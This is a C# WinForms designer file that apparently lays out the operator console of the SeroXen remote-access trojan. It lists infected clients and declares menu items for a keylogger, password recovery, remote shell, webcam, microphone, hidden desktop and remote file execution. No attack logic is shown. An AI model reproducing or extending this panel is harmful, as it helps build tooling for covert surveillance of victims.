            this.imgFlags.Images.SetKeyName(118, "kn.png");
            this.imgFlags.Images.SetKeyName(119, "kp.png");
            this.imgFlags.Images.SetKeyName(120, "kr.png");
            this.imgFlags.Images.SetKeyName(121, "kw.png");
            this.imgFlags.Images.SetKeyName(122, "ky.png");
            this.imgFlags.Images.SetKeyName(123, "kz.png");
            this.imgFlags.Images.SetKeyName(124, "la.png");
            this.imgFlags.Images.SetKeyName(125, "lb.png");
            this.imgFlags.Images.SetKeyName(126, "lc.png");
            this.imgFlags.Images.SetKeyName(127, "li.png");
            this.imgFlags.Images.SetKeyName(128, "lk.png");
            this.imgFlags.Images.SetKeyName(129, "lr.png");
            this.imgFlags.Images.SetKeyName(130, "ls.png");
            this.imgFlags.Images.SetKeyName(131, "lt.png");
            this.imgFlags.Images.SetKeyName(132, "lu.png");
            this.imgFlags.Images.SetKeyName(133, "lv.png");
            this.imgFlags.Images.SetKeyName(134, "ly.png");
            this.imgFlags.Images.SetKeyName(135, "ma.png");
            this.imgFlags.Images.SetKeyName(136, "mc.png");
            this.imgFlags.Images.SetKeyName(137, "md.png");
            this.imgFlags.Images.SetKeyName(138, "me.png");
            this.imgFlags.Images.SetKeyName(139, "mg.png");
            this.imgFlags.Images.SetKeyName(140, "mh.png");
            this.imgFlags.Images.SetKeyName(141, "mk.png");
            this.imgFlags.Images.SetKeyName(142, "ml.png");
            this.imgFlags.Images.SetKeyName(143, "mm.png");
            this.imgFlags.Images.SetKeyName(144, "mn.png");
            this.imgFlags.Images.SetKeyName(145, "mo.png");
            this.imgFlags.Images.SetKeyName(146, "mp.png");
            this.imgFlags.Images.SetKeyName(147, "mq.png");
            this.imgFlags.Images.SetKeyName(148, "mr.png");
            this.imgFlags.Images.SetKeyName(149, "ms.png");
            this.imgFlags.Images.SetKeyName(150, "mt.png");
            this.imgFlags.Images.SetKeyName(151, "mu.png");
            this.imgFlags.Images.SetKeyName(152, "mv.png");
            this.imgFlags.Images.SetKeyName(153, "mw.png");
            this.imgFlags.Images.SetKeyName(154, "mx.png");
            this.imgFlags.Images.SetKeyName(155, "my.png");
            this.imgFlags.Images.SetKeyName(156, "mz.png");
            this.imgFlags.Images.SetKeyName(157, "na.png");
            this.imgFlags.Images.SetKeyName(158, "nc.png");
            this.imgFlags.Images.SetKeyName(159, "ne.png");
            this.imgFlags.Images.SetKeyName(160, "nf.png");
            this.imgFlags.Images.SetKeyName(161, "ng.png");
            this.imgFlags.Images.SetKeyName(162, "ni.png");
            this.imgFlags.Images.SetKeyName(163, "nl.png");
            this.imgFlags.Images.SetKeyName(164, "no.png");
            this.imgFlags.Images.SetKeyName(165, "np.png");
            this.imgFlags.Images.SetKeyName(166, "nr.png");
            this.imgFlags.Images.SetKeyName(167, "nu.png");
            this.imgFlags.Images.SetKeyName(168, "nz.png");
            this.imgFlags.Images.SetKeyName(169, "om.png");
            this.imgFlags.Images.SetKeyName(170, "pa.png");
            this.imgFlags.Images.SetKeyName(171, "pe.png");
            this.imgFlags.Images.SetKeyName(172, "pf.png");
            this.imgFlags.Images.SetKeyName(173, "pg.png");
            this.imgFlags.Images.SetKeyName(174, "ph.png");
            this.imgFlags.Images.SetKeyName(175, "pk.png");
            this.imgFlags.Images.SetKeyName(176, "pl.png");
            this.imgFlags.Images.SetKeyName(177, "pm.png");
            this.imgFlags.Images.SetKeyName(178, "pn.png");
            this.imgFlags.Images.SetKeyName(179, "pr.png");
            this.imgFlags.Images.SetKeyName(180, "ps.png");
            this.imgFlags.Images.SetKeyName(181, "pt.png");
            this.imgFlags.Images.SetKeyName(182, "pw.png");
            this.imgFlags.Images.SetKeyName(183, "py.png");
            this.imgFlags.Images.SetKeyName(184, "qa.png");
            this.imgFlags.Images.SetKeyName(185, "re.png");
            this.imgFlags.Images.SetKeyName(186, "ro.png");
            this.imgFlags.Images.SetKeyName(187, "rs.png");
            this.imgFlags.Images.SetKeyName(188, "ru.png");
            this.imgFlags.Images.SetKeyName(189, "rw.png");
            this.imgFlags.Images.SetKeyName(190, "sa.png");
            this.imgFlags.Images.SetKeyName(191, "sb.png");
            this.imgFlags.Images.SetKeyName(192, "sc.png");
            this.imgFlags.Images.SetKeyName(193, "scotland.png");
            this.imgFlags.Images.SetKeyName(194, "sd.png");
            this.imgFlags.Images.SetKeyName(195, "se.png");
            this.imgFlags.Images.SetKeyName(196, "sg.png");
            this.imgFlags.Images.SetKeyName(197, "sh.png");
            this.imgFlags.Images.SetKeyName(198, "si.png");
            this.imgFlags.Images.SetKeyName(199, "sj.png");
            this.imgFlags.Images.SetKeyName(200, "sk.png");
            this.imgFlags.Images.SetKeyName(201, "sl.png");
            this.imgFlags.Images.SetKeyName(202, "sm.png");
            this.imgFlags.Images.SetKeyName(203, "sn.png");
            this.imgFlags.Images.SetKeyName(204, "so.png");
            this.imgFlags.Images.SetKeyName(205, "sr.png");
            this.imgFlags.Images.SetKeyName(206, "st.png");
            this.imgFlags.Images.SetKeyName(207, "sv.png");
            this.imgFlags.Images.SetKeyName(208, "sy.png");
            this.imgFlags.Images.SetKeyName(209, "sz.png");
            this.imgFlags.Images.SetKeyName(210, "tc.png");
            this.imgFlags.Images.SetKeyName(211, "td.png");
            this.imgFlags.Images.SetKeyName(212, "tf.png");
            this.imgFlags.Images.SetKeyName(213, "tg.png");
            this.imgFlags.Images.SetKeyName(214, "th.png");
            this.imgFlags.Images.SetKeyName(215, "tj.png");
            this.imgFlags.Images.SetKeyName(216, "tk.png");
            this.imgFlags.Images.SetKeyName(217, "tl.png");
            this.imgFlags.Images.SetKeyName(218, "tm.png");
            this.imgFlags.Images.SetKeyName(219, "tn.png");
            this.imgFlags.Images.SetKeyName(220, "to.png");
            this.imgFlags.Images.SetKeyName(221, "tr.png");
            this.imgFlags.Images.SetKeyName(222, "tt.png");
            this.imgFlags.Images.SetKeyName(223, "tv.png");
            this.imgFlags.Images.SetKeyName(224, "tw.png");
            this.imgFlags.Images.SetKeyName(225, "tz.png");
            this.imgFlags.Images.SetKeyName(226, "ua.png");
            this.imgFlags.Images.SetKeyName(227, "ug.png");
            this.imgFlags.Images.SetKeyName(228, "um.png");
            this.imgFlags.Images.SetKeyName(229, "us.png");
            this.imgFlags.Images.SetKeyName(230, "uy.png");
            this.imgFlags.Images.SetKeyName(231, "uz.png");
            this.imgFlags.Images.SetKeyName(232, "va.png");
            this.imgFlags.Images.SetKeyName(233, "vc.png");
            this.imgFlags.Images.SetKeyName(234, "ve.png");
            this.imgFlags.Images.SetKeyName(235, "vg.png");
            this.imgFlags.Images.SetKeyName(236, "vi.png");
            this.imgFlags.Images.SetKeyName(237, "vn.png");
            this.imgFlags.Images.SetKeyName(238, "vu.png");
            this.imgFlags.Images.SetKeyName(239, "wales.png");
            this.imgFlags.Images.SetKeyName(240, "wf.png");
            this.imgFlags.Images.SetKeyName(241, "ws.png");
            this.imgFlags.Images.SetKeyName(242, "ye.png");
            this.imgFlags.Images.SetKeyName(243, "yt.png");
            this.imgFlags.Images.SetKeyName(244, "za.png");
            this.imgFlags.Images.SetKeyName(245, "zm.png");
            this.imgFlags.Images.SetKeyName(246, "zw.png");
            this.imgFlags.Images.SetKeyName(247, "xy.png");
            // 
            // notifyIcon
            // 
            this.notifyIcon.Icon = ((System.Drawing.Icon)(resources.GetObject("notifyIcon.Icon")));
            this.notifyIcon.Text = "SeroXen";
            this.notifyIcon.Visible = true;
            this.notifyIcon.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(this.notifyIcon_MouseDoubleClick);
            // 
            // tableLayoutPanel
            // 
            this.tableLayoutPanel.ColumnCount = 1;
            this.tableLayoutPanel.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle());
            this.tableLayoutPanel.Controls.Add(this.lstClients, 0, 0);
            this.tableLayoutPanel.GrowStyle = System.Windows.Forms.TableLayoutPanelGrowStyle.FixedSize;
            this.tableLayoutPanel.Location = new System.Drawing.Point(192, 1);
            this.tableLayoutPanel.Name = "tableLayoutPanel";
            this.tableLayoutPanel.RowCount = 1;
            this.tableLayoutPanel.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Absolute, 457F));
            this.tableLayoutPanel.Size = new System.Drawing.Size(911, 457);
            this.tableLayoutPanel.TabIndex = 6;
            this.tableLayoutPanel.Paint += new System.Windows.Forms.PaintEventHandler(this.tableLayoutPanel_Paint_1);
            // 
            // lstClients
            // 
            this.lstClients.BackColor = System.Drawing.Color.White;
            this.lstClients.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.hIP,
            this.hTag,
            this.hUserPC,
            this.hVersion,
            this.hStatus,
            this.hUserStatus,
            this.hCountry,
            this.hOS,
            this.hAccountType});
            this.lstClients.ContextMenuStrip = this.contextMenuStrip;
            this.lstClients.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.lstClients.FullRowSelect = true;
            this.lstClients.HideSelection = false;
            this.lstClients.Location = new System.Drawing.Point(3, 3);
            this.lstClients.Name = "lstClients";
            this.lstClients.ShowItemToolTips = true;
            this.lstClients.Size = new System.Drawing.Size(895, 451);
            this.lstClients.SmallImageList = this.imgFlags;
            this.lstClients.TabIndex = 1;
            this.lstClients.UseCompatibleStateImageBehavior = false;
            this.lstClients.View = System.Windows.Forms.View.Details;
            this.lstClients.SelectedIndexChanged += new System.EventHandler(this.lstClients_SelectedIndexChanged);
            // 
            // hIP
            // 
            this.hIP.Text = "IP Address";
            this.hIP.Width = 112;
            // 
            // hTag
            // 
            this.hTag.Text = "Tag";
            // 
            // hUserPC
            // 
            this.hUserPC.Text = "User@PC";
            this.hUserPC.Width = 175;
            // 
            // hVersion
            // 
            this.hVersion.Text = "Version";
            this.hVersion.Width = 69;
            // 
            // hStatus
            // 
            this.hStatus.Text = "Status";
            this.hStatus.Width = 78;
            // 
            // hUserStatus
            // 
            this.hUserStatus.Text = "User Status";
            this.hUserStatus.Width = 100;
            // 
            // hCountry
            // 
            this.hCountry.Text = "Country";
            this.hCountry.Width = 80;
            // 
            // hOS
            // 
            this.hOS.Text = "Operating System";
            this.hOS.Width = 110;
            // 
            // hAccountType
            // 
            this.hAccountType.Text = "Account Type";
            this.hAccountType.Width = 100;
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Arial", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.Location = new System.Drawing.Point(59, 23);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(101, 18);
            this.label1.TabIndex = 7;
            this.label1.Text = "YOUR NAME";
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(53, 44);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(0, 13);
            this.label2.TabIndex = 8;
            this.label2.Click += new System.EventHandler(this.label2_Click);
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label3.Location = new System.Drawing.Point(59, 44);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(129, 13);
            this.label3.TabIndex = 12;
            this.label3.Text = "Listening on port: none";
            this.label3.Click += new System.EventHandler(this.label3_Click);
            // 
            // guna2ImageButton1
            // 
            this.guna2ImageButton1.CheckedState.ImageSize = new System.Drawing.Size(64, 64);
            this.guna2ImageButton1.HoverState.ImageSize = new System.Drawing.Size(36, 36);
            this.guna2ImageButton1.Image = ((System.Drawing.Image)(resources.GetObject("guna2ImageButton1.Image")));
            this.guna2ImageButton1.ImageOffset = new System.Drawing.Point(0, 0);
            this.guna2ImageButton1.ImageRotate = 0F;
            this.guna2ImageButton1.ImageSize = new System.Drawing.Size(36, 36);
            this.guna2ImageButton1.Location = new System.Drawing.Point(12, 19);
            this.guna2ImageButton1.Name = "guna2ImageButton1";
            this.guna2ImageButton1.PressedState.ImageSize = new System.Drawing.Size(36, 36);
            this.guna2ImageButton1.Size = new System.Drawing.Size(54, 45);
            this.guna2ImageButton1.TabIndex = 14;
            this.guna2ImageButton1.Click += new System.EventHandler(this.guna2ImageButton1_Click);
            // 
            // timer1
            // 
            this.timer1.Enabled = true;
            this.timer1.Interval = 50;
            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // guna2ShadowPanel1
            // 
            this.guna2ShadowPanel1.BackColor = System.Drawing.Color.White;
            this.guna2ShadowPanel1.FillColor = System.Drawing.Color.White;
            this.guna2ShadowPanel1.ForeColor = System.Drawing.Color.White;
            this.guna2ShadowPanel1.Location = new System.Drawing.Point(-2, 288);
            this.guna2ShadowPanel1.Name = "guna2ShadowPanel1";
            this.guna2ShadowPanel1.ShadowColor = System.Drawing.Color.White;
            this.guna2ShadowPanel1.Size = new System.Drawing.Size(196, 123);
            this.guna2ShadowPanel1.TabIndex = 15;
            // 
            // tabPage6
            // 
            this.tabPage6.Location = new System.Drawing.Point(204, 4);
            this.tabPage6.Name = "tabPage6";
            this.tabPage6.Size = new System.Drawing.Size(0, 361);
            this.tabPage6.TabIndex = 5;
            this.tabPage6.Text = "tabPage6";
            this.tabPage6.UseVisualStyleBackColor = true;
            // 
            // tabPage5
            // 
            this.tabPage5.Location = new System.Drawing.Point(204, 4);
            this.tabPage5.Name = "tabPage5";
            this.tabPage5.Size = new System.Drawing.Size(0, 361);
            this.tabPage5.TabIndex = 4;
            this.tabPage5.Text = "Sign Out";
            this.tabPage5.UseVisualStyleBackColor = true;
            // 
            // tabPage4
            // 
            this.tabPage4.Location = new System.Drawing.Point(204, 4);
            this.tabPage4.Name = "tabPage4";
            this.tabPage4.Size = new System.Drawing.Size(0, 361);
            this.tabPage4.TabIndex = 3;
            this.tabPage4.Text = "Update";
            this.tabPage4.UseVisualStyleBackColor = true;
            // 
            // tabPage3
            // 
            this.tabPage3.Location = new System.Drawing.Point(204, 4);
            this.tabPage3.Name = "tabPage3";
            this.tabPage3.Size = new System.Drawing.Size(0, 361);
            this.tabPage3.TabIndex = 2;
            this.tabPage3.Text = "About";
            this.tabPage3.UseVisualStyleBackColor = true;
            // 
            // tabPage2
            // 
            this.tabPage2.Location = new System.Drawing.Point(204, 4);
            this.tabPage2.Name = "tabPage2";
            this.tabPage2.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage2.Size = new System.Drawing.Size(0, 361);
            this.tabPage2.TabIndex = 1;
            this.tabPage2.Text = "Builder";
            this.tabPage2.UseVisualStyleBackColor = true;
            // 
            // tabPage1
            // 
            this.tabPage1.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.tabPage1.Location = new System.Drawing.Point(204, 4);
            this.tabPage1.Name = "tabPage1";
            this.tabPage1.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage1.Size = new System.Drawing.Size(0, 361);
            this.tabPage1.TabIndex = 0;
            this.tabPage1.Text = "Dashboard";
            this.tabPage1.UseVisualStyleBackColor = true;
            // 
            // guna2TabControl1
            // 
            this.guna2TabControl1.Alignment = System.Windows.Forms.TabAlignment.Left;
            this.guna2TabControl1.Controls.Add(this.tabPage1);
            this.guna2TabControl1.Controls.Add(this.tabPage2);
            this.guna2TabControl1.Controls.Add(this.tabPage3);
            this.guna2TabControl1.Controls.Add(this.tabPage4);
            this.guna2TabControl1.Controls.Add(this.tabPage5);
            this.guna2TabControl1.Controls.Add(this.tabPage6);
            this.guna2TabControl1.Controls.Add(this.tabPage7);
            this.guna2TabControl1.Controls.Add(this.tabPage8);
            this.guna2TabControl1.Controls.Add(this.tabPage9);
            this.guna2TabControl1.Cursor = System.Windows.Forms.Cursors.Default;
            this.guna2TabControl1.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2TabControl1.ItemSize = new System.Drawing.Size(200, 40);
            this.guna2TabControl1.Location = new System.Drawing.Point(-1, 89);
            this.guna2TabControl1.Name = "guna2TabControl1";
            this.guna2TabControl1.Padding = new System.Drawing.Point(6, 10);
            this.guna2TabControl1.SelectedIndex = 0;
            this.guna2TabControl1.Size = new System.Drawing.Size(196, 369);
            this.guna2TabControl1.TabButtonHoverState.BorderColor = System.Drawing.Color.Empty;
            this.guna2TabControl1.TabButtonHoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.guna2TabControl1.TabButtonHoverState.Font = new System.Drawing.Font("Segoe UI Semibold", 10F);
            this.guna2TabControl1.TabButtonHoverState.ForeColor = System.Drawing.Color.Black;
            this.guna2TabControl1.TabButtonHoverState.InnerColor = System.Drawing.Color.White;
            this.guna2TabControl1.TabButtonIdleState.BorderColor = System.Drawing.Color.Empty;
            this.guna2TabControl1.TabButtonIdleState.FillColor = System.Drawing.Color.Transparent;
            this.guna2TabControl1.TabButtonIdleState.Font = new System.Drawing.Font("Segoe UI Semibold", 10F);
            this.guna2TabControl1.TabButtonIdleState.ForeColor = System.Drawing.Color.Black;
            this.guna2TabControl1.TabButtonIdleState.InnerColor = System.Drawing.Color.Transparent;
            this.guna2TabControl1.TabButtonSelectedState.BorderColor = System.Drawing.Color.White;
            this.guna2TabControl1.TabButtonSelectedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(224)))), ((int)(((byte)(224)))), ((int)(((byte)(224)))));
            this.guna2TabControl1.TabButtonSelectedState.Font = new System.Drawing.Font("Segoe UI Semibold", 10F);
            this.guna2TabControl1.TabButtonSelectedState.ForeColor = System.Drawing.Color.Black;
            this.guna2TabControl1.TabButtonSelectedState.InnerColor = System.Drawing.Color.SlateBlue;
            this.guna2TabControl1.TabButtonSize = new System.Drawing.Size(200, 40);
            this.guna2TabControl1.TabIndex = 13;
            this.guna2TabControl1.TabMenuBackColor = System.Drawing.Color.WhiteSmoke;
            // 
            // tabPage7
            // 
            this.tabPage7.Location = new System.Drawing.Point(204, 4);
            this.tabPage7.Name = "tabPage7";
            this.tabPage7.Size = new System.Drawing.Size(0, 361);
            this.tabPage7.TabIndex = 6;
            this.tabPage7.Text = "tabPage7";
            this.tabPage7.UseVisualStyleBackColor = true;
            // 
            // tabPage8
            // 
            this.tabPage8.Location = new System.Drawing.Point(204, 4);
            this.tabPage8.Name = "tabPage8";
            this.tabPage8.Size = new System.Drawing.Size(0, 361);
            this.tabPage8.TabIndex = 7;
            this.tabPage8.Text = "tabPage8";
            this.tabPage8.UseVisualStyleBackColor = true;
            // 
            // tabPage9
            // 
            this.tabPage9.Location = new System.Drawing.Point(204, 4);
            this.tabPage9.Name = "tabPage9";
            this.tabPage9.Size = new System.Drawing.Size(0, 361);
            this.tabPage9.TabIndex = 8;
            this.tabPage9.Text = "Settings";
            this.tabPage9.UseVisualStyleBackColor = true;
            // 
            // FrmMain
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(96F, 96F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
            this.BackColor = System.Drawing.SystemColors.ButtonFace;
            this.ClientSize = new System.Drawing.Size(1095, 464);
            this.Controls.Add(this.guna2ShadowPanel1);
            this.Controls.Add(this.label3);
            this.Controls.Add(this.label1);
            this.Controls.Add(this.guna2ImageButton1);
            this.Controls.Add(this.label2);
            this.Controls.Add(this.tableLayoutPanel);
            this.Controls.Add(this.guna2TabControl1);
            this.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.ForeColor = System.Drawing.Color.Black;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MinimumSize = new System.Drawing.Size(680, 415);
            this.Name = "FrmMain";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "SeroXen | v3.1.5 |";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.FrmMain_FormClosing);
            this.Load += new System.EventHandler(this.FrmMain_Load);
            this.contextMenuStrip.ResumeLayout(false);
            this.tableLayoutPanel.ResumeLayout(false);
            this.guna2TabControl1.ResumeLayout(false);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion
        private System.Windows.Forms.ContextMenuStrip contextMenuStrip;
        private System.Windows.Forms.ToolStripMenuItem connectionToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem reconnectToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem disconnectToolStripMenuItem;
        private System.Windows.Forms.ImageList imgFlags;
        private System.Windows.Forms.ToolStripMenuItem systemToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem uninstallToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem surveillanceToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem remoteDesktopToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem taskManagerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem fileManagerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem systemInformationToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem OtherToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem visitWebsiteToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem passwordRecoveryToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem showMessageboxToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem updateToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem remoteShellToolStripMenuItem;
        private System.Windows.Forms.ToolStripSeparator ctxtLine;
        private System.Windows.Forms.ToolStripMenuItem actionsToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem shutdownToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem restartToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem standbyToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem startupManagerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem remoteExecuteToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem localFileToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem webFileToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem keyloggerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem reverseProxyToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem registryEditorToolStripMenuItem;
        private System.Windows.Forms.NotifyIcon notifyIcon;
        private System.Windows.Forms.ToolStripSeparator lineToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem selectAllToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem elevateClientPermissionsToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem connectionsToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem remoteWebcamToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem remoteMicrophoneToolStripMenuItem;
        private System.Windows.Forms.TableLayoutPanel tableLayoutPanel;
        private AeroListView lstClients;
        private System.Windows.Forms.ColumnHeader hIP;
        private System.Windows.Forms.ColumnHeader hTag;
        private System.Windows.Forms.ColumnHeader hUserPC;
        private System.Windows.Forms.ColumnHeader hVersion;
        private System.Windows.Forms.ColumnHeader hStatus;
        private System.Windows.Forms.ColumnHeader hUserStatus;
        private System.Windows.Forms.ColumnHeader hCountry;
        private System.Windows.Forms.ColumnHeader hOS;
        private System.Windows.Forms.ColumnHeader hAccountType;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.Label label3;
        private Guna.UI2.WinForms.Guna2ImageButton guna2ImageButton1;
        private System.Windows.Forms.Timer timer1;
        private Guna.UI2.WinForms.Guna2ShadowPanel guna2ShadowPanel1;
        private System.Windows.Forms.ToolStripMenuItem remoteHVNCToolStripMenuItem;
        private System.Windows.Forms.TabPage tabPage6;
        private System.Windows.Forms.TabPage tabPage5;
        private System.Windows.Forms.TabPage tabPage4;
        private System.Windows.Forms.TabPage tabPage3;
        private System.Windows.Forms.TabPage tabPage2;
        private System.Windows.Forms.TabPage tabPage1;
        private Guna.UI2.WinForms.Guna2TabControl guna2TabControl1;
        private System.Windows.Forms.TabPage tabPage7;
        private System.Windows.Forms.TabPage tabPage8;
        private System.Windows.Forms.TabPage tabPage9;
    }
}

